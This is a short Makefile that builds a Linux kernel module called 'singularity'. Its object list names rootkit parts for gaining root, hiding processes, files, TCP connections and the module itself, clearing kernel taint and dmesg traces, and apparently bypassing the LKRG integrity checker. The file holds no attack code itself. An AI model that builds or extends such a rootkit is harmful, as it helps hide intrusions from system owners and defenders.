obj-m += singularity.o

singularity-objs := main.o \
    modules/reset_tainted.o \
    modules/become_root.o \
    modules/hiding_directory.o \
    modules/hiding_tcp.o \
    modules/clear_taint_dmesg.o \
    modules/hidden_pids.o \
    modules/hiding_stat.o \
    modules/hooks_write.o \
    modules/hiding_chdir.o \
    modules/hiding_readlink.o \
    modules/open.o \
    modules/bpf_hook.o \
    modules/icmp.o \
    modules/audit.o \
    modules/task.o \
    modules/lkrg_bypass.o \
    modules/hide_module.o modules/trace.o ftrace/ftrace_helper.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
